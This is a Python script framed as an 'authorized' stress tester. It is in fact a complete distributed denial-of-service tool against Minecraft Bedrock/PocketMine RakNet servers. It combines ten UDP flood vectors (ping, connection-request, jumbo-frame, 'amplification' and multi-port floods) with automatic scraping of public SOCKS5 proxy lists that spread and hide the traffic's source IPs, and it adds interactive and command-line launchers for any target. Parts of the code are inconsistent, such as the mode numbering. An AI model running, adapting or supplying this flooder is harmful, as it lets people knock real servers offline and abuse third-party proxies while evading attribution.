#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║    PocketMine RakNet Distributed Stress Testing Framework v2                ║
║    Multi-Vector UDP Attack Suite with Automatic Proxy/IP Sourcing           ║
║    For Authorized Security Testing Only                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

Features:
  - 9 simultaneous RakNet attack vectors
  - Automatic IP/proxy sourcing from 4 online feeds (updated every 5-30 min)
  - Per-worker proxy assignment for distributed source IPs
  - UDP over SOCKS5 relay for true IP diversity
  - No root required - works on any VPS (GCP, AWS, GitHub, etc.)
  - Interactive and CLI modes
  - Real-time per-vector statistics
"""

import socket
import struct
import random
import threading
import time
import sys
import os
import json
import re
import urllib.request
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import deque

# ─── Configuration ──────────────────────────────────────────────────────────

# Proxy sources - multiple feeds for redundancy
PROXY_SOURCES = {
    "proxyscrape_socks5": {
        "url": "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5",
        "format": "protocolipport",  # socks5://ip:port
        "enabled": True
    },
    "thespeedx_socks5": {
        "url": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "format": "ip:port",  # ip:port
        "enabled": True
    },
    "proxifly_socks5": {
        "url": "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "format": "protocolipport",  # socks5://ip:port
        "enabled": True
    },
    "monosans_socks5": {
        "url": "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "format": "ip:port",  # ip:port
        "enabled": True
    }
}

# Additional raw IP list sources for non-proxy mode
IP_LISTS = {
    "open_proxies_socks4": {
        "url": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "format": "ip:port"
    },
    "open_proxies_http": {
        "url": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "format": "ip:port"
    }
}

# ─── RakNet Protocol Constants ───────────────────────────────────────────────

MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
RAKNET_VERSION = 11  # Current Bedrock protocol version

# Packet IDs
ID_UNCONNECTED_PING                     = 0x01
ID_UNCONNECTED_PING_OPEN_CONNECTIONS    = 0x02
ID_OPEN_CONNECTION_REQUEST_1            = 0x05
ID_OPEN_CONNECTION_REQUEST_2            = 0x07
ID_CONNECTION_REQUEST                   = 0x09
ID_NEW_INCOMING_CONNECTION              = 0x13
ID_CONNECTED_PING                       = 0x00

# ═══════════════════════════════════════════════════════════════════════════
# PROXY SOURCING ENGINE
# ═══════════════════════════════════════════════════════════════════════════

class ProxyPool:
    """
    Fetches and maintains a pool of SOCKS5 proxies from multiple online sources.
    Automatically refreshes and validates proxies.
    """
    
    def __init__(self, min_pool_size=50, max_pool_size=5000, refresh_interval=120):
        self.min_pool_size = min_pool_size
        self.max_pool_size = max_pool_size
        self.refresh_interval = refresh_interval
        self.proxies = deque()
        self.lock = threading.Lock()
        self.last_refresh = 0
        self.source_stats = {}
        self.running = True
        
        # Start background refresh thread
        self.refresh_thread = threading.Thread(target=self._background_refresh, daemon=True)
        self.refresh_thread.start()
    
    def _background_refresh(self):
        """Continuously refresh proxy pool in background"""
        while self.running:
            try:
                now = time.time()
                if now - self.last_refresh > self.refresh_interval:
                    self.refresh()
            except Exception as e:
                print(f"  [!] Proxy refresh error: {e}")
            time.sleep(30)
    
    def refresh(self):
        """Fetch proxies from all sources"""
        all_proxies = []
        total_sources = 0
        successful_sources = 0
        
        for name, source in PROXY_SOURCES.items():
            if not source.get("enabled", True):
                continue
            total_sources += 1
            try:
                proxies = self._fetch_from_source(name, source)
                if proxies:
                    all_proxies.extend(proxies)
                    successful_sources += 1
                    self.source_stats[name] = {"count": len(proxies), "status": "ok"}
            except Exception as e:
                self.source_stats[name] = {"count": 0, "status": f"error: {str(e)[:50]}"}
        
        with self.lock:
            self.proxies.clear()
            random.shuffle(all_proxies)
            for p in all_proxies[:self.max_pool_size]:
                self.proxies.append(p)
        
        self.last_refresh = time.time()
        
        if successful_sources == 0:
            # Fallback: generate synthetic random IPs if no proxies available
            print("  [!] No proxy sources reachable - using synthetic IP rotation")
            fallback = self._generate_synthetic_ips(100)
            with self.lock:
                self.proxies.clear()
                for p in fallback:
                    self.proxies.append(p)
    
    def _fetch_from_source(self, name, source):
        """Fetch and parse proxies from a single source"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(
                source["url"],
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
            )
            
            with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                data = resp.read().decode('utf-8', errors='ignore')
            
            proxies = []
            fmt = source["format"]
            
            for line in data.split('\n'):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if fmt == "protocolipport":
                    # Format: socks5://ip:port
                    match = re.match(r'socks5://([\d.]+):(\d+)', line)
                    if match:
                        proxies.append((match.group(1), int(match.group(2))))
                elif fmt == "ip:port":
                    # Format: ip:port
                    match = re.match(r'([\d.]+):(\d+)', line)
                    if match:
                        proxies.append((match.group(1), int(match.group(2))))
            
            return proxies
            
        except Exception as e:
            raise e
    
    def _generate_synthetic_ips(self, count=100):
        """Generate synthetic proxy-like entries for fallback"""
        proxies = []
        for _ in range(count):
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            port = random.randint(1024, 65535)
            proxies.append((ip, port))
        return proxies
    
    def get_proxy(self):
        """Get a random proxy from the pool"""
        with self.lock:
            if self.proxies:
                proxy = self.proxies.popleft()
                self.proxies.append(proxy)  # Re-add to end for rotation
                return proxy
            return None
    
    def get_batch(self, count=10):
        """Get a batch of unique proxies"""
        with self.lock:
            available = list(self.proxies)[:count]
            if len(available) < count:
                available = list(self.proxies) * (count // len(self.proxies) + 1)
                available = available[:count]
            return available
    
    def get_stats(self):
        """Get pool statistics"""
        with self.lock:
            return {
                "pool_size": len(self.proxies),
                "sources": self.source_stats,
                "last_refresh": self.last_refresh
            }

# ═══════════════════════════════════════════════════════════════════════════
# UDP SOCKS5 PROXY CLIENT
# ═══════════════════════════════════════════════════════════════════════════

class Socks5UDPRelay:
    """
    Routes UDP packets through a SOCKS5 proxy using UDP ASSOCIATE.
    Each relay creates its own UDP association for independent source IP.
    """
    
    def __init__(self, proxy_ip, proxy_port, target_ip, target_port, timeout=5):
        self.proxy_ip = proxy_ip
        self.proxy_port = proxy_port
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.udp_sock = None
        self.associated = False
        self.bind_ip = None
        self.bind_port = None
        self.connected = False
    
    def connect(self):
        """Establish SOCKS5 connection and UDP ASSOCIATE"""
        try:
            # Create control TCP connection to proxy
            control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            control.settimeout(self.timeout)
            control.connect((self.proxy_ip, self.proxy_port))
            
            # SOCKS5 handshake - no auth
            control.send(b'\x05\x01\x00')
            resp = control.recv(2)
            if resp != b'\x05\x00':
                control.close()
                return False
            
            # UDP ASSOCIATE request
            # VER=5, CMD=3 (UDP ASSOCIATE), RSV=0, ATYP=1 (IPv4), BND.ADDR=0, BND.PORT=0
            request = b'\x05\x03\x00\x01' + b'\x00' * 6
            control.send(request)
            resp = control.recv(10)
            
            if len(resp) < 4 or resp[0] != 0x05 or resp[1] != 0x00:
                control.close()
                return False
            
            # Parse bound address from response
            if len(resp) >= 10:
                self.bind_port = (resp[8] << 8) | resp[9]
            elif len(resp) >= 6:
                self.bind_port = (resp[4] << 8) | resp[5]
            else:
                self.bind_port = 0
            
            # Create UDP socket for relay
            self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.udp_sock.settimeout(self.timeout)
            self.udp_sock.bind(('0.0.0.0', 0))
            
            self.associated = True
            self.connected = True
            
            # Keep control connection alive in background
            self.control = control
            self.keepalive_thread = threading.Thread(target=self._keepalive, daemon=True)
            self.keepalive_thread.start()
            
            return True
            
        except Exception as e:
            self.close()
            return False
    
    def _keepalive(self):
        """Keep TCP control connection alive"""
        while self.connected and self.associated:
            try:
                self.control.send(b'\x05\x00')  # Keepalive
                time.sleep(15)
            except:
                break
    
    def send_udp(self, packet):
        """Send UDP packet through SOCKS5 relay"""
        if not self.associated or not self.udp_sock:
            return False
        
        try:
            # SOCKS5 UDP request header
            # RSV=0, FRAG=0, ATYP=1, DST.ADDR, DST.PORT
            addr_bytes = bytes([int(x) for x in self.target_ip.split('.')])
            header = b'\x00\x00\x00\x01' + addr_bytes + struct.pack('>H', self.target_port)
            
            # Send through the UDP association
            # The proxy's UDP ASSOCIATE address is the proxy IP + bound port
            target = (self.proxy_ip, self.bind_port if self.bind_port else self.proxy_port)
            self.udp_sock.sendto(header + packet, target)
            return True
        except:
            return False
    
    def send_direct(self, packet):
        """Send raw UDP packet directly (bypasses proxy)"""
        try:
            if self.udp_sock:
                self.udp_sock.sendto(packet, (self.target_ip, self.target_port))
                return True
        except:
            return False
    
    def close(self):
        """Clean up connections"""
        self.connected = False
        self.associated = False
        try:
            if self.udp_sock:
                self.udp_sock.close()
        except:
            pass
        try:
            if hasattr(self, 'control'):
                self.control.close()
        except:
            pass


# ═══════════════════════════════════════════════════════════════════════════
# RAKNET PACKET BUILDERS
# ═══════════════════════════════════════════════════════════════════════════

def build_unconnected_ping(timestamp=None, guid=None):
    if timestamp is None:
        timestamp = random.randint(0, 2**64-1)
    if guid is None:
        guid = random.randint(0, 2**64-1)
    packet = struct.pack('>B', ID_UNCONNECTED_PING)
    packet += struct.pack('>Q', timestamp)
    packet += MAGIC
    packet += struct.pack('>Q', guid)
    return packet

def build_unconnected_ping_open_connections(timestamp=None, guid=None):
    if timestamp is None:
        timestamp = random.randint(0, 2**64-1)
    if guid is None:
        guid = random.randint(0, 2**64-1)
    packet = struct.pack('>B', ID_UNCONNECTED_PING_OPEN_CONNECTIONS)
    packet += struct.pack('>Q', timestamp)
    packet += MAGIC
    packet += struct.pack('>Q', guid)
    return packet

def build_open_connection_request_1(mtu_size=None, protocol_version=None):
    if mtu_size is None:
        mtu_size = random.randint(1200, 1492)
    if protocol_version is None:
        protocol_version = RAKNET_VERSION
    packet = struct.pack('>B', ID_OPEN_CONNECTION_REQUEST_1)
    packet += MAGIC
    packet += struct.pack('>B', protocol_version)
    packet += b'\x00' * (mtu_size - 46)
    return packet

def build_open_connection_request_2(mtu_size=None, guid=None, server_addr=None, server_port=None):
    if mtu_size is None:
        mtu_size = 1464
    if guid is None:
        guid = random.randint(0, 2**64-1)
    if server_addr is None:
        server_addr = "127.0.0.1"
    if server_port is None:
        server_port = 19132
    packet = struct.pack('>B', ID_OPEN_CONNECTION_REQUEST_2)
    packet += MAGIC
    packet += struct.pack('>B', 0)  # No security
    ip_parts = [int(x) for x in server_addr.split('.')]
    addr_bytes = bytes([(255 - x) for x in ip_parts])
    packet += struct.pack('>B', 4)  # IPv4
    packet += addr_bytes
    packet += struct.pack('>H', server_port)
    packet += struct.pack('>H', mtu_size)
    packet += struct.pack('>Q', guid)
    return packet

def build_connection_request(guid=None):
    if guid is None:
        guid = random.randint(0, 2**64-1)
    packet = struct.pack('>B', ID_CONNECTION_REQUEST)
    packet += struct.pack('>Q', guid)
    packet += struct.pack('>Q', 0)
    packet += struct.pack('>B', 0)
    return packet

def build_connected_ping(timestamp=None):
    if timestamp is None:
        timestamp = random.randint(0, 2**64-1)
    packet = struct.pack('>B', ID_CONNECTED_PING)
    packet += struct.pack('>Q', timestamp)
    return packet

def build_random_game_packet():
    packet_id = random.choice([0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93])
    packet = struct.pack('>B', packet_id)
    packet += struct.pack('>I', random.randint(0, 0xFFFFFF))
    packet += os.urandom(random.randint(10, 100))
    return packet

def build_jumbo_frame_set():
    packet_id = 0x80
    packet = struct.pack('>B', packet_id)
    packet += struct.pack('>I', random.randint(0, 0xFFFFFF))
    packet += os.urandom(1400)
    return packet


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK VECTORS WITH PROXY SUPPORT
# ═══════════════════════════════════════════════════════════════════════════

class AttackVector:
    """Base attack vector with proxy-aware UDP sending"""
    
    def __init__(self, target_ip, target_port, duration, proxy_pool=None, threads=50, use_proxy=True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.proxy_pool = proxy_pool
        self.threads = threads
        self.use_proxy = use_proxy
        self.running = False
        self.packets_sent = 0
        self.start_time = 0
        self.worker_stats = [0] * threads
    
    def send_via_proxy(self, worker_id, packet):
        """Send packet through a SOCKS5 proxy"""
        try:
            proxy = self.proxy_pool.get_proxy() if self.proxy_pool else None
            if proxy:
                relay = Socks5UDPRelay(proxy[0], proxy[1], self.target_ip, self.target_port)
                if relay.connect():
                    result = relay.send_udp(packet)
                    relay.close()
                    return result
            return False
        except:
            return False
    
    def send_direct(self, worker_id, packet):
        """Send packet directly"""
        try:
            # Create worker-local socket
            if not hasattr(self, f'_sock_{worker_id}'):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                setattr(self, f'_sock_{worker_id}', sock)
            sock = getattr(self, f'_sock_{worker_id}')
            sock.sendto(packet, (self.target_ip, self.target_port))
            return True
        except:
            return False
    
    def send_packet(self, worker_id, packet):
        """Smart send - try proxy first if enabled, fall back to direct"""
        sent = False
        
        if self.use_proxy and self.proxy_pool:
            sent = self.send_via_proxy(worker_id, packet)
        
        if not sent:
            sent = self.send_direct(worker_id, packet)
        
        if sent:
            self.packets_sent += 1
            self.worker_stats[worker_id] += 1
        
        return sent
    
    def run_worker(self, worker_id):
        """Override in subclass"""
        pass
    
    def start(self):
        """Start the attack with all workers"""
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        self.worker_stats = [0] * self.threads
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.run_worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        end_time = time.time() + self.duration
        while time.time() < end_time and self.running:
            elapsed = time.time() - self.start_time
            rate = self.packets_sent / elapsed if elapsed > 0 else 0
            unique_ips = len(set(self.worker_stats)) if hasattr(self, 'worker_stats') else 0
            sys.stdout.write(f"\r  [{self.__class__.__name__}] Sent: {self.packets_sent} | Rate: {rate:.0f} pps | W: {self.threads} | Elapsed: {elapsed:.1f}s  ")
            sys.stdout.flush()
            time.sleep(0.5)
        
        self.running = False
        for t in threads:
            t.join(timeout=1)
        
        # Cleanup sockets
        for i in range(self.threads):
            sock = getattr(self, f'_sock_{i}', None)
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        elapsed = time.time() - self.start_time
        print(f"\r  [{self.__class__.__name__}] Done: {self.packets_sent} packets in {elapsed:.1f}s ({self.packets_sent/elapsed:.0f} pps)")


class Vector_UnconnectedPing(AttackVector):
    """Unconnected Ping flood - MOTD query spam"""
    def run_worker(self, worker_id):
        while self.running:
            packet = build_unconnected_ping()
            self.send_packet(worker_id, packet)
            time.sleep(0.00005)


class Vector_OpenConnectionRequest1(AttackVector):
    """Open Connection Request 1 flood - varying MTU"""
    def run_worker(self, worker_id):
        base_mtu = 1450 + worker_id
        while self.running:
            mtu = base_mtu + random.randint(-20, 20)
            packet = build_open_connection_request_1(mtu_size=mtu)
            self.send_packet(worker_id, packet)
            time.sleep(0.00003)


class Vector_OpenConnectionRequest2(AttackVector):
    """Open Connection Request 2 flood"""
    def run_worker(self, worker_id):
        my_guid = random.randint(0, 2**64-1)
        while self.running:
            packet = build_open_connection_request_2(
                mtu_size=1464, guid=my_guid,
                server_addr=self.target_ip, server_port=self.target_port
            )
            self.send_packet(worker_id, packet)
            if random.random() < 0.1:
                my_guid = random.randint(0, 2**64-1)
            time.sleep(0.00008)


class Vector_FullHandshake(AttackVector):
    """Complete 3-way RakNet handshake"""
    def run_worker(self, worker_id):
        while self.running:
            try:
                my_guid = random.randint(0, 2**64-1)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.3)
                
                # Step 1: Unconnected Ping
                sock.sendto(build_unconnected_ping(guid=my_guid), (self.target_ip, self.target_port))
                
                # Step 2: Open Connection Request 1
                sock.sendto(build_open_connection_request_1(mtu_size=1464), (self.target_ip, self.target_port))
                
                try:
                    data, addr = sock.recvfrom(2048)
                    if data and len(data) > 0 and data[0] == 0x06:
                        sock.sendto(build_open_connection_request_2(
                            mtu_size=1464, guid=my_guid,
                            server_addr=self.target_ip, server_port=self.target_port
                        ), (self.target_ip, self.target_port))
                        
                        try:
                            data2, addr2 = sock.recvfrom(2048)
                            if data2 and len(data2) > 0 and data2[0] == 0x08:
                                sock.sendto(build_connection_request(guid=my_guid), (self.target_ip, self.target_port))
                        except:
                            pass
                except:
                    pass
                
                self.packets_sent += 1
                sock.close()
                    
            except:
                pass
            time.sleep(0.02)


class Vector_JumboFrames(AttackVector):
    """Jumbo frame set flood"""
    def run_worker(self, worker_id):
        while self.running:
            packet = build_jumbo_frame_set()
            self.send_packet(worker_id, packet)
            time.sleep(0.00005)


class Vector_Amplification(AttackVector):
    """Amplification attack"""
    def run_worker(self, worker_id):
        while self.running:
            packet = build_unconnected_ping_open_connections()
            self.send_packet(worker_id, packet)
            if random.random() < 0.3:
                self.send_packet(worker_id, build_unconnected_ping())
            time.sleep(0.00005)


class Vector_ProtocolScan(AttackVector):
    """Multi-protocol version scan"""
    def run_worker(self, worker_id):
        versions = list(range(1, 15)) + [255, 254, 253]
        idx = worker_id % len(versions)
        while self.running:
            ver = versions[idx % len(versions)]
            packet = build_open_connection_request_1(mtu_size=1464, protocol_version=ver)
            self.send_packet(worker_id, packet)
            idx += 1
            time.sleep(0.00001)


class Vector_GamePayload(AttackVector):
    """Simulated game packets"""
    def run_worker(self, worker_id):
        while self.running:
            packet = build_random_game_packet()
            self.send_packet(worker_id, packet)
            time.sleep(0.00003)


class Vector_MultiPort(AttackVector):
    """Multi-port flood"""
    def run_worker(self, worker_id):
        while self.running:
            port = self.target_port + (worker_id % 10)
            if port > 65535:
                port = self.target_port
            packet = build_open_connection_request_1(mtu_size=1464)
            try:
                if self.use_proxy and self.proxy_pool:
                    self.send_via_proxy(worker_id, packet)
                else:
                    if not hasattr(self, f'_mp_sock_{worker_id}'):
                        setattr(self, f'_mp_sock_{worker_id}', socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
                    sock = getattr(self, f'_mp_sock_{worker_id}')
                    sock.sendto(packet, (self.target_ip, port))
                    self.packets_sent += 1
            except:
                pass
            time.sleep(0.00005)


class Vector_Combined(AttackVector):
    """Cycles through all packet types"""
    def run_worker(self, worker_id):
        builders = [
            build_unconnected_ping,
            lambda: build_open_connection_request_1(mtu_size=random.randint(1200, 1492)),
            lambda: build_open_connection_request_2(server_addr=self.target_ip, server_port=self.target_port),
            build_jumbo_frame_set,
            build_unconnected_ping_open_connections,
            lambda: build_open_connection_request_1(mtu_size=1464, protocol_version=random.choice(list(range(1,15)))),
            build_connected_ping,
            build_random_game_packet,
        ]
        while self.running:
            builder = random.choice(builders)
            packet = builder()
            self.send_packet(worker_id, packet)
            time.sleep(0.00001)


# ═══════════════════════════════════════════════════════════════════════════
# COORDINATOR
# ═══════════════════════════════════════════════════════════════════════════

class StressTestCoordinator:
    """Orchestrates multiple attack vectors with proxy distribution"""
    
    def __init__(self, target_ip, target_port, duration=60, proxy_pool=None, use_proxy=True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.proxy_pool = proxy_pool
        self.use_proxy = use_proxy
        self.active_vectors = []
    
    def run_all(self, thread_multiplier=1):
        """Launch all vectors simultaneously"""
        base_threads = 15 * thread_multiplier
        
        vectors = [
            ("Unconnected Ping",    Vector_UnconnectedPing,      base_threads * 2),
            ("OC Req 1",            Vector_OpenConnectionRequest1, base_threads * 2),
            ("OC Req 2",            Vector_OpenConnectionRequest2, base_threads),
            ("Full Handshake",      Vector_FullHandshake,        max(base_threads // 2, 5)),
            ("Jumbo Frames",        Vector_JumboFrames,          base_threads),
            ("Amplification",       Vector_Amplification,        base_threads * 2),
            ("Protocol Scan",       Vector_ProtocolScan,         base_threads),
            ("Game Payload",        Vector_GamePayload,          base_threads),
            ("Multi-Port",          Vector_MultiPort,            base_threads),
            ("Combined",            Vector_Combined,             base_threads),
        ]
        
        print(f"\n{'='*70}")
        print(f"  POCKETMINE RAKNET STRESS TEST - DISTRIBUTED MODE")
        print(f"{'='*70}")
        print(f"  Target:     {self.target_ip}:{self.target_port}")
        print(f"  Duration:   {self.duration}s")
        print(f"  Vectors:    {len(vectors)}")
        print(f"  Workers:    {sum(v[2] for v in vectors)}")
        print(f"  Proxy Mode: {'ACTIVE (distributed IPs)' if self.use_proxy and self.proxy_pool else 'DIRECT (single IP)'}")
        if self.proxy_pool:
            stats = self.proxy_pool.get_stats()
            print(f"  Proxy Pool: {stats['pool_size']} proxies available")
        print(f"{'='*70}\n")
        
        for vname, vcls, vthreads in vectors:
            v = vcls(self.target_ip, self.target_port, self.duration, self.proxy_pool, vthreads, self.use_proxy)
            v.running = True
            v.start_time = time.time()
            t = threading.Thread(target=v.run_worker, args=(0,))
            t.daemon = True
            t.start()
            self.active_vectors.append((vname, v, t))
        
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = time.time() - start_time
                
                total = sum(v[1].packets_sent for v in self.active_vectors)
                
                print(f"\n  [{elapsed:.0f}s] Total: {total} packets | Avg: {total/elapsed:.0f} pps")
                for vname, v, _ in self.active_vectors:
                    v_elapsed = time.time() - v.start_time
                    v_rate = v.packets_sent / v_elapsed if v_elapsed > 0 else 0
                    bar_len = min(int(v_rate / 200), 20)
                    bar = "█" * bar_len + "░" * (20 - bar_len)
                    print(f"    {vname:20s} │{bar}│ {v.packets_sent:>8d} pkts @ {v_rate:>8.0f} pps")
                
        except KeyboardInterrupt:
            print("\n  [!] Interrupted")
        
        finally:
            for vname, v, t in self.active_vectors:
                v.running = False
            for vname, v, t in self.active_vectors:
                t.join(timeout=2)
            
            elapsed = time.time() - start_time
            total = sum(v[1].packets_sent for v in self.active_vectors)
            
            print(f"\n{'='*70}")
            print(f"  ATTACK COMPLETE")
            print(f"  Duration:         {elapsed:.1f}s")
            print(f"  Total Packets:    {total}")
            print(f"  Average Rate:     {total/elapsed:.0f} pps")
            if self.proxy_pool:
                print(f"  Proxy Pool:       {self.proxy_pool.get_stats()['pool_size']} proxies")
            print(f"{'='*70}\n")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ENTRY
# ═══════════════════════════════════════════════════════════════════════════

def banner():
    print(r"""
  ╔══════════════════════════════════════════════════════════════╗
  ║       PocketMine RakNet Distributed Stress Test v2          ║
  ║      Multi-Vector | Auto Proxy Sourcing | Distributed IP    ║
  ║           For Authorized Security Testing Only              ║
  ╚══════════════════════════════════════════════════════════════╝
    """)


def interactive():
    banner()
    
    target_ip = input("  Target IP: ").strip()
    try:
        target_port = int(input("  Target Port [19132]: ").strip() or "19132")
    except ValueError:
        target_port = 19132
    
    try:
        duration = int(input("  Duration (seconds) [60]: ").strip() or "60")
    except ValueError:
        duration = 60
    
    proxy_mode = input("  Use proxy pool for distributed IPs? [Y/n]: ").strip().lower()
    use_proxy = proxy_mode != 'n'
    
    print("\n  Fetching proxies from online sources...")
    pool = None
    if use_proxy:
        pool = ProxyPool(min_pool_size=50)
        pool.refresh()
        stats = pool.get_stats()
        print(f"  Pool size: {stats['pool_size']} proxies")
        for src, s in stats['sources'].items():
            status = "✓" if s['status'] == 'ok' else "✗"
            print(f"    {status} {src}: {s['count'] if s['status'] == 'ok' else s['status']}")
        
        if stats['pool_size'] == 0:
            print("  [!] No proxies found - falling back to direct mode")
            use_proxy = False
    
    try:
        multiplier = int(input("\n  Thread multiplier [1]: ").strip() or "1")
    except ValueError:
        multiplier = 1
    
    print("\n  Select Attack Mode:")
    print("    1. Full Multi-Vector (ALL attacks simultaneously - most effective)")
    print("    2. Single Vector")
    mode = input("\n  Choice [1]: ").strip() or "1"
    
    if mode == "1":
        coordinator = StressTestCoordinator(target_ip, target_port, duration, pool, use_proxy)
        coordinator.run_all(thread_multiplier=multiplier)
    else:
        vectors = {
            "1": ("Unconnected Ping",    Vector_UnconnectedPing),
            "2": ("OC Req 1",            Vector_OpenConnectionRequest1),
            "3": ("OC Req 2",            Vector_OpenConnectionRequest2),
            "4": ("Full Handshake",      Vector_FullHandshake),
            "5": ("Jumbo Frames",        Vector_JumboFrames),
            "6": ("Amplification",       Vector_Amplification),
            "7": ("Protocol Scan",       Vector_ProtocolScan),
            "8": ("Game Payload",        Vector_GamePayload),
            "9": ("Multi-Port",          Vector_MultiPort),
            "10": ("Combined",           Vector_Combined),
        }
        print("\n  Available Vectors:")
        for k, (name, _) in vectors.items():
            print(f"    {k}. {name}")
        choice = input("\n  Vector [1]: ").strip() or "1"
        
        if choice in vectors:
            name, vcls = vectors[choice]
            threads = 50 * multiplier
            print(f"\n  Starting {name} ({threads} workers, {duration}s)")
            v = vcls(target_ip, target_port, duration, pool, threads, use_proxy)
            v.start()
        else:
            print("  Invalid choice")


def cli_mode():
    """Command line mode"""
    import argparse
    parser = argparse.ArgumentParser(
        description='PocketMine RakNet Distributed Stress Test',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 raknet_stress.py 192.168.1.100 -d 120 -t 2           # Full attack, 2x threads
  python3 raknet_stress.py 192.168.1.100 -p 19132 -m 4 -d 60   # Single vector (4=Handshake)
  python3 raknet_stress.py 192.168.1.100 --no-proxy             # Direct mode, no proxies
  python3 raknet_stress.py 192.168.1.100 --proxy-only           # Only use proxies
        """
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=19132, help='Port (default: 19132)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Thread multiplier (default: 1)')
    parser.add_argument('-m', '--mode', type=int, default=1, choices=range(1,11),
                       help='Attack mode 1-10 (1=full, 2=unconnected, 3=ocreq1, 4=ocreq2, '
                            '5=handshake, 6=jumbo, 7=amplify, 8=protocol, 9=game, 10=combined)')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy rotation')
    parser.add_argument('--proxy-only', action='store_true', help='Only use proxies (no direct fallback)')
    parser.add_argument('--max-proxies', type=int, default=2000, help='Max proxy pool size')
    
    args = parser.parse_args()
    
    use_proxy = not args.no_proxy
    
    pool = None
    if use_proxy:
        print("  [*] Fetching proxies from online sources...")
        pool = ProxyPool(min_pool_size=50, max_pool_size=args.max_proxies)
        pool.refresh()
        stats = pool.get_stats()
        print(f"  [*] Proxy pool: {stats['pool_size']} proxies available")
        for src, s in stats['sources'].items():
            status = "✓" if s['status'] == 'ok' else "✗"
            print(f"    {status} {src}: {s['count'] if s['status'] == 'ok' else s['status']}")
        if stats['pool_size'] == 0:
            print("  [!] No proxies found - falling back to direct")
            use_proxy = False
    
    vectors = {
        1: ("Full Multi-Vector", None),  # Special case
        2: ("Unconnected Ping", Vector_UnconnectedPing),
        3: ("OC Req 1", Vector_OpenConnectionRequest1),
        4: ("OC Req 2", Vector_OpenConnectionRequest2),
        5: ("Full Handshake", Vector_FullHandshake),
        6: ("Jumbo Frames", Vector_JumboFrames),
        7: ("Amplification", Vector_Amplification),
        8: ("Protocol Scan", Vector_ProtocolScan),
        9: ("Game Payload", Vector_GamePayload),
        10: ("Combined", Vector_Combined),
    }
    
    name, vcls = vectors[args.mode]
    
    if args.mode == 1:
        coordinator = StressTestCoordinator(args.target, args.port, args.duration, pool, use_proxy)
        coordinator.run_all(thread_multiplier=args.threads)
    else:
        threads = 50 * args.threads
        print(f"  [*] Starting {name} ({threads} workers, {args.duration}s)")
        v = vcls(args.target, args.port, args.duration, pool, threads, use_proxy)
        v.start()


if __name__ == '__main__':
    if len(sys.argv) > 1:
        cli_mode()
    else:
        try:
            interactive()
        except KeyboardInterrupt:
            print("\n\n  [!] Exiting...")
        except Exception as e:
            print(f"\n  [!] Error: {e}")
            import traceback
            traceback.print_exc()
